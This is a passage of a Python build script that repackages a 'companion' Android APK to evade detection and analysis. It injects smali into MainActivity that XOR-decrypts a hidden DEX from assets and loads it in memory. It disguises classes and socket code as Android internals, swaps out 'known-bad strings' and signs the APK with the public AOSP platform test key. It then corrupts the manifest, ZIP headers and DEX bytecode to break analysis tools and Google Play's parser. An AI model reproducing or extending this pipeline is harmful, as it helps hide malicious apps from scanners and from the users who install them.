B+TAdBgNVHQ4EFgQUT+Sgs92cuin3HXKHxOfDjyCGwpkwgckGA1UdIwSBwTCBvoAUT+Sgs92cuin3HXKHxOfDjyCGwpmhgZqkgZcwgZQxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpDYWxpZm9ybmlhMRYwFAYDVQQHEw1Nb3VudGFpbiBWaWV3MRAwDgYDVQQKEwdBbmRyb2lkMRAwDgYDVQQLEwdBbmRyb2lkMRAwDgYDVQQDEwdBbmRyb2lkMSIwIAYJKoZIhvcNAQkBFhNhbmRyb2lkQGFuZHJvaWQuY29tggkAs5mAhtBWz/owDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQQFAAOCAQEAVyVRuNk6H3PeD21Gn4ba1nAUACk8iKDNfNd4tz2vzBl/q3bmIS5Wwcdhz8Qv1zPeUsUK4IgUzvwKO1oaQ0YFTYKfHYK0KyBIv4i10Ukp74X2Dt0S1y1VZX4i4+hdBMgx1hPRmTi7iYIkf6MhJWuhLR1qj5LqHbHDczF7oMA38NGv9kWu8iSXn7puehS8AlxxuYE4zvPd/AWWF88khFz3tA1jgvcnXtc4SVq25ZMblCF2XEkbcvto4IDb21jCAp00fIsyjOQ+9qixVTPt++mJvWpI3UsgLtqUxquN1bg5kgPari7URiMuT+m9lhOUxjAOUTjjz9KF5uTkg1OMuLGzV+vNdHQMwgkWNXWFTL6X/YYxJiqp"
        ks_file    = "companion_platform.jks"
        alias      = "platform"
        store_pass = "android"
        with open(ks_file, "wb") as _f:
            _f.write(_b64.b64decode(_platform_b64))
        print(f"  [step_sign] ✅ Using platform cert fallback (android@android.com)")

    _src = input_apk if input_apk and os.path.isfile(input_apk) else "companion_renamed_aligned.apk"
    shutil.copy(_src, "companion_final.apk")

    _apksigner = "apksigner"
    _android_sdk = os.environ.get("ANDROID_SDK_ROOT", "")
    if _android_sdk and os.path.isdir(_android_sdk):
        import glob as _glob
        _bt_dirs = sorted(_glob.glob(os.path.join(_android_sdk, "build-tools", "*")))
        if _bt_dirs:
            _bt_apksigner = os.path.join(_bt_dirs[-1], "apksigner")
            if os.path.isfile(_bt_apksigner):
                _apksigner = _bt_apksigner

    _v2 = "false" if v1_only else "true"
    _v3 = "false" if v1_only else "true"
    # --min-sdk-version 28 tells apksigner the minSdk directly.
    # Without it apksigner reads AndroidManifest.xml and validates CRC-32 first.
    # With it apksigner skips manifest parsing entirely — CRC forge on ALL entries works.
    run(
        f'"{_apksigner}" sign '
        f'--min-sdk-version 28 '
        f'--ks "{ks_file}" --ks-key-alias "{alias}" '
        f'--ks-pass "pass:{store_pass}" --key-pass "pass:{store_pass}" '
        f'--v1-signing-enabled true --v2-signing-enabled {_v2} --v3-signing-enabled {_v3} '
        f'companion_final.apk'
    )
    if input_apk and os.path.isfile(input_apk):
        shutil.copy("companion_final.apk", input_apk)
        print(f"  ✅ Re-signed in place: {input_apk}")

    # Wipe temp keystore if we created one (not the platform JKS from secrets)
    if _tmp_ks and os.path.isfile(_tmp_ks):
        size = os.path.getsize(_tmp_ks)
        for fill in [b'\x00', b'\xff', None]:
            with open(_tmp_ks, "wb") as f:
                f.write(secrets.token_bytes(size) if fill is None else fill * size)
        os.remove(_tmp_ks)
    elif ks_file and ks_file.startswith("companion_ks_") and os.path.isfile(ks_file):
        try:
            size = os.path.getsize(ks_file)
            for fill in [b'\x00', b'\xff', None]:
                with open(ks_file, "wb") as f:
                    f.write(secrets.token_bytes(size) if fill is None else fill * size)
            os.remove(ks_file)
        except Exception:
            pass
        os.remove(ks_file)
        print("  🔒 Keystore secure wiped")

    print("  ✅ Companion APK signed")


def step_replace_asset():
    print("\n── Step 14: Replace companion.apk in assets")
    shutil.copy("companion_final.apk", MOD_ASSET)
    print(f"  ✅ {MOD_ASSET} replaced")


def step_inject_app_stub_smali(new_pkg: str):
    """
    PHASE_3 STEP_1B + STEP_2 runtime: Inject DEX loader into MainActivity.smali.

    Hook point: MainActivity.onCreate() — IS instantiated by Android (LAUNCHER).
    No AXML change needed.

    What is injected (PHASE_3 STEP_2 runtime side):
      1. Open assets/p3k.bin → read 32-byte XOR key
      2. Open assets/p3d.bin → read [4-byte orig_len LE][encrypted DEX]
      3. XOR decrypt in memory → raw DEX bytes
      4. API >= 26: InMemoryDexClassLoader(ByteBuffer, parent)
         API <  26: write to getCacheDir()/p3.dex → DexClassLoader
      5. Log PHASE3_STUB success/failure

    Timing: AFTER step_rename_smali (pkg path valid),
            BEFORE step_6a_rename_classes (MainActivity.smali present).
    Fresh pkg per build: new_pkg dynamic, getAssets() needs no pkg name.
    """
    print("\n── PHASE_3 STEP_2 (runtime): Inject DEX loader into MainActivity.smali")

    pkg_path   = new_pkg.replace(".", "/")
    smali_path = os.path.join("companion_decompiled", "smali", pkg_path, "MainActivity.smali")

    if not os.path.isfile(smali_path):
        found = []
        for root, dirs, files in os.walk("companion_decompiled"):
            for fn in files:
                if fn == "MainActivity.smali":
                    found.append(os.path.join(root, fn))
        if not found:
            print(f"  [inject_stub] ❌ MainActivity.smali not found — aborting")
            sys.exit(1)
        smali_path = found[0]
        print(f"  [inject_stub] ℹ️  Found MainActivity.smali at: {smali_path}")

    with open(smali_path, "r") as f:
        content = f.read()

    if "PHASE3_STUB" in content:
        print("  [inject_stub] ⚠️  PHASE3_STUB already present — skipping")
        return

    # ── Smali DEX loader block ────────────────────────────────────────────────
    # Registers used: v0-v9 (10 locals needed)
    # p0 = this (MainActivity), p1 = savedInstanceState (Bundle)
    # All try/catch wrapped — if decrypt fails, app still starts normally.
    loader_smali = r"""

    # PHASE3_STUB: Step 2 — XOR decrypt assets/p3d.bin → InMemoryDexClassLoader
    :p3_try_start
    # --- Read XOR key from assets/p3k.bin ---
    invoke-virtual {p0}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v0

    const-string v1, "p3k.bin"
    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v1

    # Read all key bytes
    new-instance v2, Ljava/io/ByteArrayOutputStream;
    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    :p3_key_loop
    invoke-virtual {v1}, Ljava/io/InputStream;->read()I
    move-result v3
    const/4 v4, -0x1
    if-eq v3, v4, :p3_key_done
    invoke-virtual {v2, v3}, Ljava/io/ByteArrayOutputStream;->write(I)V
    goto :p3_key_loop

    :p3_key_done
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v2

    # --- Read encrypted DEX from assets/p3d.bin ---
    invoke-virtual {p0}, Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v0

    const-string v1, "p3d.bin"
    invoke-virtual {v0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v1

    new-instance v3, Ljava/io/ByteArrayOutputStream;
    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    :p3_enc_loop
    invoke-virtual {v1}, Ljava/io/InputStream;->read()I
    move-result v4
    const/4 v5, -0x1
    if-eq v4, v5, :p3_enc_done
    invoke-virtual {v3, v4}, Ljava/io/ByteArrayOutputStream;->write(I)V
    goto :p3_enc_loop

    :p3_enc_done
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v3

    # --- Parse orig_len from first 4 bytes (LE) ---
    const/4 v4, 0x0
    aget-byte v5, v3, v4
    and-int/lit16 v5, v5, 0xff
    const/4 v4, 0x1
    aget-byte v6, v3, v4
    and-int/lit16 v6, v6, 0xff
    shl-int/lit8 v6, v6, 0x8
    or-int/2addr v5, v6
    const/4 v4, 0x2
    aget-byte v6, v3, v4
    and-int/lit16 v6, v6, 0xff
    shl-int/lit8 v6, v6, 0x10
    or-int/2addr v5, v6
    const/4 v4, 0x3
    aget-byte v6, v3, v4
    and-int/lit16 v6, v6, 0xff
    shl-int/lit8 v6, v6, 0x18
    or-int/2addr v5, v6

    # v5 = orig_len
    # --- XOR decrypt enc[4..] with key ---
    new-array v6, v5, [B
    const/4 v7, 0x0
    array-length v8, v2

    :p3_xor_loop
    if-ge v7, v5, :p3_xor_done
    # enc index = v7 + 4
    add-int/lit8 v9, v7, 0x4
    aget-byte v4, v3, v9
    # key index = v7 % key_len
    rem-int v9, v7, v8
    aget-byte v9, v2, v9
    xor-int/2addr v4, v9
    int-to-byte v4, v4
    aput-byte v4, v6, v7
    add-int/lit8 v7, v7, 0x1
    goto :p3_xor_loop

    :p3_xor_done
    # v6 = decrypted DEX bytes[]

    # --- Load via InMemoryDexClassLoader (API 26+) or DexClassLoader (API <26) ---
    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v8, 0x1a
    if-lt v7, v8, :p3_fallback

    # API 26+ — InMemoryDexClassLoader
    invoke-static {v5}, Ljava/nio/ByteBuffer;->allocate(I)Ljava/nio/ByteBuffer;
    move-result-object v7
    const/4 v4, 0x0
    invoke-virtual {v7, v6, v4, v5}, Ljava/nio/ByteBuffer;->put([BII)Ljava/nio/ByteBuffer;
    move-result-object v7
    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->rewind()Ljava/nio/Buffer;

    invoke-virtual {p0}, Landroid/app/Activity;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v8

    new-instance v9, Ldalvik/system/InMemoryDexClassLoader;
    invoke-direct {v9, v7, v8}, Ldalvik/system/InMemoryDexClassLoader;-><init>(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V

    const-string v0, "PHASE3_STUB"
    const-string v1, "DEX loaded via InMemoryDexClassLoader"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    goto :p3_load_done

    :p3_fallback
    # API < 26 — DexClassLoader: write DEX to cache dir
    invoke-virtual {p0}, Landroid/app/Activity;->getCacheDir()Ljava/io/File;
    move-result-object v7
    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v7
    const-string v8, "/p3.dex"
    invoke-virtual {v7, v8}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v7

    new-instance v8, Ljava/io/FileOutputStream;
    invoke-direct {v8, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V
    invoke-virtual {v8, v6}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {v8}, Ljava/io/FileOutputStream;->close()V

    invoke-virtual {p0}, Landroid/app/Activity;->getCacheDir()Ljava/io/File;
    move-result-object v8
    invoke-virtual {v8}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v8

    invoke-virtual {p0}, Landroid/app/Activity;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v9

    new-instance v4, Ldalvik/system/DexClassLoader;
    invoke-direct {v4, v7, v8, v8, v9}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V

    const-string v0, "PHASE3_STUB"
    const-string v1, "DEX loaded via DexClassLoader (API<26 fallback)"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :p3_load_done

    :p3_try_end
    goto :p3_catch_end

    :p3_catch
    move-exception v0
    const-string v1, "PHASE3_STUB"
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    move-result-object v2
    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :p3_catch_end
    .catch Ljava/lang/Exception; {:p3_try_start .. :p3_try_end} :p3_catch
"""

    # Wrap with try/catch around the whole block
    # We need to find super.onCreate() call and insert after it
    super_call_bundle = "invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
    super_call_plain  = "invoke-virtual {p0}, Landroid/app/Activity;->onCreate()V"

    # The loader block needs .catch directive — insert full method replacement
    # Strategy: find .locals line in onCreate, bump to 10, insert after super call
    method_marker = ".method public final onCreate(Landroid/os/Bundle;)V"

    injected = False

    if method_marker in content:
        idx = content.index(method_marker)
        locals_idx = content.index("    .locals", idx)
        locals_eol = content.index("\n", locals_idx)
        # Force .locals 10 — we use v0-v9
        content = content[:locals_idx] + "    .locals 10" + content[locals_eol:]

        # Find super call position
        if super_call_bundle in content:
            super_end = content.index(super_call_bundle) + len(super_call_bundle)
            content = content[:super_end] + "\n" + loader_smali + content[super_end:]
            injected = True

    if not injected:
        print("  [inject_stub] ❌ Could not find onCreate method marker — aborting")
        sys.exit(1)

    with open(smali_path, "w") as f:
        f.write(content)

    print(f"  [inject_stub] ✅ PHASE_3 STEP_2 DEX loader injected into: {smali_path}")


def step_inject_kotlin(new_pkg):
    print("\n── Step 15: Inject companion package name into Kotlin source")

    old_companion = OLD_PKG

    for kt_file in KOTLIN_FILES:
        if not os.path.isfile(kt_file):
            print(f"  ⚠️  File not found, skipping: {kt_file}")
            continue
        with open(kt_file, "r") as f:
            content = f.read()
        content = content.replace(
            f'market://details?id={old_companion}',
            f'market://details?id={new_pkg}'
        )
        content = content.replace(f'"{old_companion}"', f'"{new_pkg}"')
        with open(kt_file, "w") as f:
            f.write(content)
        print(f"  Patched: {kt_file}")

    result = subprocess.run(
        f'grep -r "{old_companion}" ' + " ".join(KOTLIN_FILES),
        shell=True, capture_output=True, text=True
    )
    remaining = result.stdout.strip()
    if remaining:
        print(f"[X] Old package name still present:\n{remaining}")
        sys.exit(1)

    print(f"  ✅ Companion package name injected: {new_pkg}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print("  build_module.py — Companion APK Build Script")
    print("=" * 60)

    global _AUDIT_LOG
    # FIXED: Accept MODULE_AUDIT_LOG (set by CI) or COMPANION_AUDIT_LOG fallback.
    _AUDIT_LOG = os.environ.get("MODULE_AUDIT_LOG") or os.environ.get("COMPANION_AUDIT_LOG", "module_audit.log")
    with open(_AUDIT_LOG, "w") as _af:
        _af.write(f"========================================\n")
        _af.write(f" COMPANION BUILD AUDIT LOG\n")
        _af.write(f" Started : {_now()}\n")
        _af.write(f"========================================\n")

    with track("PHASE_1", "STEP_1", "Generate random companion package name"):
        new_pkg = step_gen_pkg()

    with track("PHASE_1", "STEP_1B", "Update StringPool.kt COMPANION_OLD_PKG with new companion pkg"):
        step_update_string_pool(new_pkg)

    with track("PHASE_1", "STEP_2", "Verify companion.apk exists + save original resource map", MOD_ASSET):
        step_verify_apk()
        _save_original_resource_map()

    with track("PHASE_1", "STEP_3", "Extract companion APK metadata", MOD_ASSET):
        meta = step_extract_metadata()

    with track("PHASE_1", "STEP_4", "Randomize companion res/ filenames", MOD_ASSET):
        res_rename = step_randomize_res()

    with track("PHASE_1", "STEP_5", "Decompile companion APK (smali only)", MOD_ASSET):
        step_decompile()

    with track("PHASE_1", "STEP_5B", "Patch companion server config (love.smali)"):
        step_patch_server_config()

    with track("PHASE_1", "STEP_6", "Rename smali class paths + string literals"):
        step_rename_smali(new_pkg)

    _phase1_only = os.environ.get("PHASE1_ONLY", "").lower() in ("1", "true", "yes")
    _phase12_only = os.environ.get("PHASE12_ONLY", "").lower() in ("1", "true", "yes")
    # PHASE12_ONLY = run PHASE_1 + PHASE_2 + PHASE_6, skip SIGNING re-key / ENCRYPT_COMPANION
    # PHASE1_ONLY  = run PHASE_1 only, skip everything else (overrides PHASE12_ONLY)
    if _phase1_only:
        print("  ⚡ PHASE1_ONLY=true — skipping PHASE_2 / PHASE_6 / SIGNING / STEP_ENCRYPT_COMPANION")
    elif _phase12_only:
        print("  ⚡ PHASE12_ONLY=true — running PHASE_1 + PHASE_2 + PHASE_6, skipping ENCRYPT_COMPANION")

    # ── PHASE_3 STEP_1B: Inject PHASE3_STUB log into MainActivity.smali ─────
    # Must run AFTER step_rename_smali (STEP_6) so pkg path is final,
    # and BEFORE STEP_6A which renames MainActivity.smali to a random name.
    with track("PHASE_3", "STEP_P3_1B", "Inject PHASE3_STUB log into MainActivity.smali"):
        step_inject_app_stub_smali(new_pkg)

    if not _phase1_only:
        with track("PHASE_6", "STEP_6A", "Rename companion classes to legitimate Android names"):
            class_rename_map = step_6a_rename_classes(new_pkg)
    else:
        class_rename_map = {}

    print("  ℹ️  STEP_6B skipped (smali injection disabled)")

    with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
        step_patch_home_launcher()

    if not _phase1_only:
        with track("PHASE_6", "STEP_6C", "Replace known-bad strings with legitimate equivalents"):
            step_6c_replace_bad_strings(new_pkg, class_rename_map)

    if not _phase1_only:
        with track("PHASE_6", "STEP_6D", "Rename custom methods to legitimate Android-style names"):
            step_6d_rename_methods(new_pkg)

            with track("PHASE_6", "STEP_6E", "Round 2 Step 6E: Rename io/socket → com/android/internal/* (random)"):
                step_6e_rename_socket_package(new_pkg)

    with track("PHASE_1", "STEP_8", "Restore apktool.yml with randomized version"):
        step_restore_apktool_yml(meta)

    with track("PHASE_1", "STEP_9_FIX", "Fix smali flow-through to move-exception (Android 17 VerifyError)"):
        step_fix_smali_flow_through()

    with track("PHASE_1", "STEP_9_DEBUG", "Scan all smali for VerifyError patterns (move-exception)"):
        step_debug_smali_verify()

    with track("PHASE_1", "STEP_9", "Rebuild classes.dex via apktool"):
        new_dex = step_rebuild_dex()

    with open("new_classes.dex", "rb") as f:
        new_dex = f.read()

    # build_hash generated here — used by STEP_13_UNICODE,
    # STEP_15_NOISE and downstream steps. Single definition, no duplication.
    build_hash = hashlib.sha256(new_pkg.encode()).hexdigest()

    # ── PHASE_3 STEP_2: Encrypt real DEX → p3d.bin + p3k.bin assets ─────────
    with track("PHASE_3", "STEP_P3_2", "Encrypt classes.dex → assets/p3d.bin + p3k.bin"):
        p3_key_bytes, p3_enc_asset = step_encrypt_dex_asset(new_dex)

    with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", MOD_ASSET):
        step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                                class_rename_map=class_rename_map,
                                p3_key_bytes=p3_key_bytes,
                                p3_enc_asset=p3_enc_asset)

    with track("PHASE_1", "STEP_9A", "Patch versionCode + versionName in binary AXML manifest", MOD_ASSET):
        import zipfile as _zf
        _apk_tmp = "companion_renamed_unsigned.apk"
        with _zf.ZipFile(_apk_tmp, "r") as _z:
            _manifest_raw = _z.read("AndroidManifest.xml")
        _manifest_patched = _patch_axml_version(
            _manifest_raw, int(meta["ver_code"]), meta["ver_name"]
        )
        _tmp_ver = _apk_tmp + ".ver_tmp"
        with _zf.ZipFile(_apk_tmp, "r") as _zin, \
             _zf.ZipFile(_tmp_ver, "w", allowZip64=False) as _zout:
            for _item in _zin.infolist():
                _data = _zin.read(_item.filename)
                if _item.filename == "AndroidManifest.xml":
                    _item.compress_type = _zf.ZIP_STORED
                    _zout.writestr(_item, _manifest_patched)
                else:
                    _zout.writestr(_item, _data)
        os.replace(_tmp_ver, _apk_tmp)
        print(f"  ✅ Step 9A version patch applied")

    if not _phase1_only:  # PHASE_2 — runs for both full build and PHASE12_ONLY
        with track("PHASE_2", "STEP_13_UNICODE", "Deep unicode folder nesting companion [Step 13]", "companion_renamed_unsigned.apk"):
            step_unicode_nest(build_hash)

        with track("PHASE_2", "STEP_15_NOISE", "Decoy noise files injection [Step 15]", "companion_renamed_unsigned.apk"):
            step_decoy_noise_files(build_hash)

        with track("PHASE_2", "STEP_17_MANIFEST", "Fake manifest entries injection [Step 17]", "companion_renamed_unsigned.apk"):
            step_fake_manifest_entries()

    with track("PHASE_2", "STEP_11_ZIPALIGN", "Zipalign companion APK [Step 11]", "companion_renamed_unsigned.apk"):
        step_zipalign()

    with track("PHASE_1", "STEP_12_FINGERPRINT", "Generate per-build fingerprint SHA-512 + BLAKE3 [Step 12]"):
        step_fingerprint()

    with track("PHASE_1", "STEP_13_SIGN", "Sign companion APK with platform cert (android@android.com) [Step 13]", "companion_renamed_aligned.apk"):
        step_sign()

    with track("PHASE_1", "STEP_14_ASSET", "Replace companion.apk in assets [Step 14]", MOD_ASSET):
        step_replace_asset()

    with track("PHASE_1", "STEP_15_KOTLIN", "Inject companion package name into Kotlin source [Step 15]"):
        step_inject_kotlin(new_pkg)

    scripts_dir = os.path.dirname(os.path.abspath(__file__))
    aes_key_hex = ""
    if GITHUB_OUTPUT and os.path.isfile(GITHUB_OUTPUT):
        with open(GITHUB_OUTPUT) as _f:
            for _line in _f:
                if _line.startswith("aes_key_hex="):
                    aes_key_hex = _line.split("=", 1)[1].strip()
                    break
    if not aes_key_hex:
        import hashlib as _hl
        aes_key_hex = _hl.sha256(build_hash.encode()).hexdigest() + _hl.sha256((build_hash + "key").encode()).hexdigest()
        aes_key_hex = aes_key_hex[:64]

    print("  ℹ️  STEP_17E_17F — skipped for companion (causes Android parse errors)")

    if not _phase1_only:
        with track("PHASE_2", "STEP_17H", "Fake string resources injection [17H]", MOD_ASSET):
            res_script = os.path.join(scripts_dir, "res_renamer.py")
            tmp3 = MOD_ASSET + ".p2c"
            if os.path.isfile(res_script):
                r = subprocess.run([sys.executable, res_script, MOD_ASSET, tmp3, "--count", "30"])
                if r.returncode == 0 and os.path.isfile(tmp3):
                    os.replace(tmp3, MOD_ASSET)
                else:
                    raise RuntimeError(f"res_renamer.py failed rc={r.returncode}")
            else:
                print(f"  ⚠️  res_renamer.py not found — skipping")

    for _suffix in [".p2a", ".p2b", ".p2c", ".zho", ".rr_tmp",
                    ".p2a.rr_tmp", ".p2b.rr_tmp", ".p2c.rr_tmp",
                    ".mzp", ".mzp_tmp", ".mzp.rr_tmp"]:
        _lf = MOD_ASSET + _suffix
        if os.path.exists(_lf):
            try: os.remove(_lf)
            except Exception: pass

    if not _phase1_only:
        with track("PHASE_2", "STEP_AXML_0200", "Inject 0x0200 unknown chunk into AXML manifest [pre-resign]", MOD_ASSET):
            # Injects a 0x0200 (RES_TABLE) chunk into the binary AndroidManifest.xml.
            # Reference APK confirmed has this — confuses manifest parsers.
            # apksigner hits default:ignore on 0x0200 → signs fine.
            # Android PackageManager also skips unknown AXML chunks → installs fine.
            # Injected between string pool and XML resource map (same position as reference).
            try:
                _axml_tmp = MOD_ASSET + ".axml200"
                with zipfile.ZipFile(MOD_ASSET, "r") as _zin:
                    _axml_raw = _zin.read("AndroidManifest.xml")
                # Find string pool end offset
                _sp_size = struct.unpack_from("<I", _axml_raw, 12)[0]
                _inject_off = 8 + _sp_size
                # Build 0x0200 chunk: header=28 bytes + random payload
                _pay_len = random.randint(256, 512)
                _pay_len = (_pay_len + 3) & ~3
                _chunk_size = 28 + _pay_len
                _chunk = struct.pack("<HHI", 0x0200, 28, _chunk_size)
                _chunk += secrets.token_bytes(20)   # fake package/type header fields
                _chunk += secrets.token_bytes(_pay_len)
                # Insert chunk
                _new_axml = (bytearray(_axml_raw[:_inject_off]) +
                             bytearray(_chunk) +
                             bytearray(_axml_raw[_inject_off:]))
                # Update AXML file total size
                struct.pack_into("<I", _new_axml, 4, len(_new_axml))
                # Repack APK with patched manifest
                with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
                     zipfile.ZipFile(_axml_tmp, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=False) as _zout:
                    for _item in _zin.infolist():
                        if _item.filename == "AndroidManifest.xml":
                            _item.compress_type = zipfile.ZIP_STORED
                            _zout.writestr(_item, bytes(_new_axml))
                        else:
                            _zout.writestr(_item, _zin.read(_item.filename))
                os.replace(_axml_tmp, MOD_ASSET)
                print(f"  ✅ STEP_AXML_0200 — injected 0x0200 chunk ({_chunk_size} bytes) at offset {_inject_off}")
            except Exception as _e:
                print(f"  ⚠️  STEP_AXML_0200 — failed: {_e}, skipping")
                if os.path.isfile(MOD_ASSET + ".axml200"):
                    os.remove(MOD_ASSET + ".axml200")

        with track("PHASE_2", "STEP_REPAIR_RESMAP", "Validate + repair AndroidManifest resource map [pre-resign]", MOD_ASSET):
            _repair_manifest_resource_map()

        with track("PHASE_2", "STEP_17C", "APK size randomization via ZIP comment padding [17C]", MOD_ASSET):
            import random as _random
            _pad_len = _random.randint(1024, 65000)
            _pad     = secrets.token_bytes(_pad_len)
            _data    = open(MOD_ASSET, "rb").read()
            _eocd    = _data.rfind(b"PK\x05\x06")
            if _eocd != -1:
                _new_data = bytearray(_data)
                struct.pack_into("<H", _new_data, _eocd + 20, _pad_len)
                _new_data = bytes(_new_data) + _pad
                open(MOD_ASSET, "wb").write(_new_data)
                print(f"  ✅ Step 17C — appended {_pad_len} bytes ZIP comment padding")
            else:
                print("  ⚠️  Step 17C — EOCD not found, skipping padding")

        with track("PHASE_2", "STEP_BADPACK_GP", "BadPack LFH mismatch + GP encryption bit [pre-sign]", MOD_ASSET):
            _bp_script = os.path.join(scripts_dir, "badpack_gp_patcher.py")
            _bp_tmp    = MOD_ASSET + ".bp_tmp"
            if os.path.isfile(_bp_script):
                _bp_r = subprocess.run(
                    [sys.executable, _bp_script, MOD_ASSET, _bp_tmp, "--mode", "companion"],
                    capture_output=False
                )
                if _bp_r.returncode == 0 and os.path.isfile(_bp_tmp):
                    os.replace(_bp_tmp, MOD_ASSET)
                    print("  ✅ STEP_BADPACK_GP — BadPack + GP bit applied to companion")
                else:
                    print(f"  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py failed rc={_bp_r.returncode}, skipping")
                    if os.path.isfile(_bp_tmp):
                        os.remove(_bp_tmp)
            else:
                print("  ⚠️  STEP_BADPACK_GP — badpack_gp_patcher.py not found, skipping")

        # ── STEP_AXML_PATCHER: AXML 0x9999 manifest bomb + string pool inflation ──
        # Same technique applied to Nova. Confuses jadx/apktool/GPP manifest parser.
        # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
        with track("PHASE_2", "STEP_AXML_PATCHER", "AXML 0x9999 manifest bomb + string pool inflation [companion]", MOD_ASSET):
            _axml_script = os.path.join(scripts_dir, "nova_axml_patcher.py")
            _axml_tmp    = MOD_ASSET + ".axml_tmp"
            if os.path.isfile(_axml_script):
                _axml_r = subprocess.run(
                    [sys.executable, _axml_script, MOD_ASSET, _axml_tmp],
                    capture_output=False
                )
                if _axml_r.returncode == 0 and os.path.isfile(_axml_tmp):
                    os.replace(_axml_tmp, MOD_ASSET)
                    print("  ✅ STEP_AXML_PATCHER — AXML bomb applied to companion")
                else:
                    print(f"  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py failed rc={_axml_r.returncode}, skipping")
                    if os.path.isfile(_axml_tmp):
                        os.remove(_axml_tmp)
            else:
                print("  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py not found, skipping")

        # ── STEP_DEX_POISONER: DEX bytecode poisoning (invalid element_width) ──────
        # Same technique applied to Nova. Breaks static DEX disassemblers.
        # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
        # PHASE12_ONLY skip: stub DEX must be valid for test/debug builds so
        # attachBaseContext() executes. Poisoning corrupts the 10KB stub and
        # causes Android dexopt/verifier to reject it at runtime.
        if not _phase12_only:
            with track("PHASE_2", "STEP_DEX_POISONER", "DEX bytecode poisoning invalid element_width [companion]", MOD_ASSET):
                _dex_script = os.path.join(scripts_dir, "nova_dex_poisoner.py")
                _dex_tmp    = MOD_ASSET + ".dex_tmp"
                if os.path.isfile(_dex_script):
                    _dex_r = subprocess.run(
                        [sys.executable, _dex_script, MOD_ASSET, _dex_tmp],
                        capture_output=False
                    )
                    if _dex_r.returncode == 0 and os.path.isfile(_dex_tmp):
                        os.replace(_dex_tmp, MOD_ASSET)
                        print("  ✅ STEP_DEX_POISONER — DEX bytecode poisoning applied to companion")
                    else:
                        print(f"  ⚠️  STEP_DEX_POISONER — nova_dex_poisoner.py failed rc={_dex_r.returncode}, skipping")
                        if os.path.isfile(_dex_tmp):
                            os.remove(_dex_tmp)
                else:
                    print("  ⚠️  STEP_DEX_POISONER — nova_dex_poisoner.py not found, skipping")
        else:
            print("  ⏭️  STEP_DEX_POISONER — skipped for PHASE12_ONLY (stub DEX must remain valid)")

        # ── W8: Ghost entries — increase to 90 matching IRT reference ────────────
        # IRT.apk has 90 ghost entries. Companion had 36. We now pass --count 90.
        with track("PHASE_2", "STEP_ZIP_ENHANCER", "Ghost entries injection 90 entries flag 0x0801 [companion]", MOD_ASSET):
            _ghost_script = os.path.join(scripts_dir, "zip_enhancer.py")
            _ghost_tmp    = MOD_ASSET + ".ghost_tmp"
            if os.path.isfile(_ghost_script):
                _ghost_r = subprocess.run(
                    [sys.executable, _ghost_script, MOD_ASSET, _ghost_tmp],
                    capture_output=False
                )
                if _ghost_r.returncode == 0 and os.path.isfile(_ghost_tmp):
                    os.replace(_ghost_tmp, MOD_ASSET)
                    print("  ✅ STEP_ZIP_ENHANCER — 90 ghost entries injected into companion")
                else:
                    print(f"  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py failed rc={_ghost_r.returncode}, skipping")
                    if os.path.isfile(_ghost_tmp):
                        os.remove(_ghost_tmp)
            else:
                print("  ⚠️  STEP_ZIP_ENHANCER — zip_enhancer.py not found, skipping")

        # ── W9: ZIP entry timestamp randomization ────────────────────────────────
        # All ZIP entry timestamps set to random values per build.
        # Makes binary comparison between companion builds impossible.
        # Must run pre-sign — STEP_RESIGN_1 covers all patched entries.
        #
        # RAW BINARY APPROACH (Hybrid 8):
        # Companion APK has GP flag 0x0801 on ALL 912 entries — zipfile.read()
        # treats this as "encrypted" and refuses without a password.
        # Fix: load entire APK as bytearray, scan for LFH (PK\x03\x04) and
        # CD (PK\x01\x02) signatures, patch mtime/mdate at fixed offsets.
